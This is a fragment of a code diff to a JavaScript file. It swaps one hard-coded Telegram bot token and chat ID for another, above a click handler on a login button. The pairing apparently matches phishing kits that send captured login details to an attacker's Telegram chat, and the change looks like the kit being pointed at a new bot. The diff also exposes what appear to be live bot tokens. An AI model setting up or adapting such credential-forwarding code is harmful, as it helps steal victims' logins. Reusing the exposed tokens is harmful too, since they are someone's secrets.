@@ -1,6 +1,5 @@
-// Telegram Bot API details
-const botToken = '7845338239:AAEAP-M0ELSKBqghH3zReaQ1AphDHZvyDaA'; // Replace with your bot's token
-const chatId = '7253995268'; // Replace with your Telegram chat ID
+const botToken = '7692091954:AAFjiDtetaQC9Y_jJTNzpugVHz1VKueLxyg'; // 
+const chatId = '8160223377'; 
 
 // Login Button Click Event
 document.getElementById('loginButton').addEventListener('click', function () {
